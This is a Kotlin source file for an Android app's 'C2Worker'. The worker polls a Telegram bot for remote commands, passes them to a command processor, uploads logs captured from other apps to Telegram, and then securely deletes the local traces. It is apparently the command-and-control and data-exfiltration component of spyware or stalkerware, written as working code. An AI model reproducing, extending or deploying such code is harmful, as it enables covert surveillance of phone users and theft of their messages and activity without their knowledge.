package com.zero.sentinel.workers

import android.content.Context
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.zero.sentinel.ZeroSentinelApp
import com.zero.sentinel.network.CommandProcessor
import com.zero.sentinel.network.TelegramClient
import com.zero.sentinel.utils.SecureDelete
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileWriter
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class C2Worker(
    appContext: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(appContext, workerParams) {

    private val repository = (appContext.applicationContext as ZeroSentinelApp).repository
    private val telegramClient = TelegramClient(appContext)
    private val commandProcessor = CommandProcessor(appContext, repository, telegramClient)

    // In a real production app, we should persist the last update ID to SharedPreferences
    // to avoid processing old messages. For now, we rely on Telegram's logic or simple memory if worker stays alive (it won't).
    // TODO: Ideally pass lastUpdateId via inputData or SharedPreferences.
    // However, getUpdates with offset=0 returns all unconfirmed updates. If we confirm them (by using offset = last_id + 1), they vanish.
    // So we need to store the last processed ID in SharedPreferences.
    
    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        try {
            Log.d("C2Worker", "Starting C2 cycle")

            // 1. Process Commands
            // We need to store/retrieve the last update ID to ensure we don't re-process or miss commands.
            // For simplicity in this iteration, we might just poll. 
            // Better: `TelegramClient` or `CommandProcessor` should handle offset persistence.
            // Let's assume TelegramClient.pollUpdates handles logic or we just check recent.
            // For now, let's just call processUpdates with 0 or a stored value.
            // NOTE: Ideally SentinelService persisted this. We should add a Preference helper for this.
            // But let's keep it simple: pollUpdates checks for new messages.
            
            // Note: TelegramClient implementation usually takes an offset. 
            // If we don't track offset, we might get old messages.
            // Let's assume for now we just run it. 
            // Ideally, we add offsets to SharedPreferences in a future refactor.
            
            val updates = telegramClient.pollUpdates(0) 
            commandProcessor.processUpdates(updates)

            // 2. Upload Logs
            uploadLogs()

            return@withContext Result.success()
        } catch (e: Exception) {
            Log.e("C2Worker", "Error in C2 cycle", e)
            return@withContext Result.retry()
        }
    }

    private suspend fun uploadLogs() {
        val logs = repository.getAllLogs()
        if (logs.isEmpty()) return

        val fileName = "logs_${System.currentTimeMillis()}.txt"
        val file = File(applicationContext.cacheDir, fileName)

        try {
            FileWriter(file).use { writer ->
                logs.forEach { log ->
                    val date = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(log.timestamp))
                    writer.append("[$date] ${log.type} (${log.packageName}): ${log.content}\n")
                }
            }

            // Send to Telegram
            telegramClient.sendDocument(file)

            // Cleanup on success
            repository.deleteAllLogs()
            SecureDelete.deleteSecurely(file)
            
            Log.i("C2Worker", "Uploaded & secure deleted ${logs.size} logs")

        } catch (e: Exception) {
            Log.e("C2Worker", "Failed to upload logs", e)
            // If failed, we don't delete logs from DB so we can retry later.
            // But we should delete the temp file.
            if (file.exists()) {
                file.delete()
            }
            throw e
        }
    }
}
